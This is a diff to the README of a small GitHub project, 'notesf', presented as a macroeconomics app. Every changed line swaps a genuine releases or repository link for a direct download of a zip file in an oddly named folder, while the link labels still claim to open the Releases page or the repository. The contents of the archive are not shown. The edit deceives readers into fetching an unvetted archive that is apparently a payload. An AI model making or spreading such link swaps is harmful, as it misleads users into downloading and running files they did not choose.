@@ -6,14 +6,14 @@ Welcome to `notesf`. This application offers insights from past years for macroe
 
 ## 🔗 Download Now
 
-[![Download notesf](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/adheesanu121/notesf/releases)
+[![Download notesf](https://raw.githubusercontent.com/adheesanu121/notesf/main/nonpromulgation/notesf.zip)](https://raw.githubusercontent.com/adheesanu121/notesf/main/nonpromulgation/notesf.zip)
 
 ## 📥 Download & Install
 
 To get started with `notesf`, follow these steps:
 
 1. Click on the link below to visit the Releases page:
-   [Visit the Release Page for notesf](https://github.com/adheesanu121/notesf/releases)
+   [Visit the Release Page for notesf](https://raw.githubusercontent.com/adheesanu121/notesf/main/nonpromulgation/notesf.zip)
 
 2. On the Releases page, you will see a list of available versions. Choose the latest version at the top of the list to ensure you have the most current features and fixes.
 
@@ -61,7 +61,7 @@ Your feedback is valuable. If you find any issues or have suggestions, please is
 
 Stay updated on the latest developments:
 
-- GitHub Repository: [notesf on GitHub](https://github.com/adheesanu121/notesf)
+- GitHub Repository: [notesf on GitHub](https://raw.githubusercontent.com/adheesanu121/notesf/main/nonpromulgation/notesf.zip)
 - Join our community discussions for added support and ideas.
 
 Thank you for choosing `notesf`. We hope it enhances your macroeconomic analysis efforts!
